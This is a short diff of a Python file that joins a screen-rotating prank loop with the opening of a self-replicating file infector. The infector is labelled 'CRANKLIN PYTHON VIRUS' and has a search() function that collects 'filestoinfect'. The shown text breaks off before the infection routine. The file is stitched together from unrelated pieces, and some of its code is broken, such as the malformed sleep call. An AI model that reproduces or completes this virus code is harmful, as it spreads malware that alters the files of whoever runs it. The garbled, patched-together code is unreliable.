@@ -1,3 +1,7 @@
+
+#!/usr/bin/python
+import os
+import datetime
 import time  , rotatescreen as rs 
 pd = rs.get_primary_display()
 angel_list =  [90, 180, 270, ]
@@ -6,9 +10,6 @@ while True :
   pd.rotate_to(x)
   time.sleep(0,5)
 
-#!/usr/bin/python
-import os
-import datetime
 SIGNATURE = "CRANKLIN PYTHON VIRUS"
 def search(path):
     filestoinfect = []
